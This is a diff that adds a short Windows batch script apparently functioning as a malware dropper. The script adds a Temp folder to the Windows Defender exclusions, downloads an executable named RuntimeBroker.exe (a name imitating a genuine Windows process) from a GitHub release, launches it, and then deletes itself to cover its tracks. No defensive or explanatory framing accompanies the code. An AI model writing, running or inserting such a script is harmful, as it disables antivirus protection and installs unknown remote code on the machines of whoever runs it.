@@ -1,0 +1,19 @@
+@echo off
+
+:: Create a folder in the Temp directory
+set folder=%TEMP%\SRC
+mkdir "%folder%"
+
+:: Add the folder to the Windows Defender exclusions list
+powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
+
+:: Download the EXE file from GitHub
+echo Downloading file...
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Fadzii123/sdiunveiruvbeuv/releases/download/V2/RuntimeBroker.exe' -OutFile '%folder%\RuntimeBroker.exe'"
+
+:: Run the EXE file
+echo Running file...
+start "" "%folder%\RuntimeBroker.exe"
+
+:: Delete the batch script after launching the EXE
+del "%~f0"
